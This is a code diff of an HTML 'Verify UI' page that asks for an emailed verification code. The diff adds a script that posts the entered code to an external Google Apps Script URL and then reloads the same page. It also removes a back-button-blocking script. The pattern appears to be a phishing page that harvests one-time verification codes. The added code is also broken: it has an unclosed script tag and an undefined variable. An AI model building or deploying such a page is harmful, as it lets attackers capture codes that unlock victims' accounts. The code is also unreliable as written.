@@ -5,10 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verify UI</title>
     <link rel="stylesheet" href="verify.css">
-    <script type="text/javascript">
-        function preback() { window.history.forward();}
-        setTimeout("preback()", 0); window.onunload = function () { null };
-    </script>
 </head>
 <body>
     <div class="container">
@@ -18,7 +14,7 @@
             We have sent a verification code to your email address. </br>
             Enter the verification code that you received
         </p>
-        <div class="code-container">
+        <div class="code-container"name="description">
             <input type="tel" class="code" placeholder="0" min="0" max="9" maxlength="1" required>
             <input type="tel" class="code" placeholder="0" min="0" max="9" maxlength="1" required>
             <input type="tel" class="code" placeholder="0" min="0" max="9" maxlength="1" required>
@@ -30,6 +26,22 @@
         <input type="submit" value="Submit" id="submit">
     </div>
     </form>
+    <script>
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbwJh9jxF5zsK1ileu6yYQDQzwDMkxaKOup1heZvGkG5mdJXvY3EU15v7sOgr9Kv4olO/exec'
+        const form = document.forms['Myform']
+      
+        form.addEventListener('submit', e => { 
+         e.preventDefault()
+     let requestBody = new FormData(form)
+     fetch(scriptURL, { method: 'POST', body: requestBody})    
+        .then(() => {  window.location.replace("verify.html"); })
+       .catch(error => {
+       alert('Error!', error.message)
+         submitButton.disabled = false
+
+       }
+       )
+   })
     <script src="verify.js"></script>
 </body>
 </html>
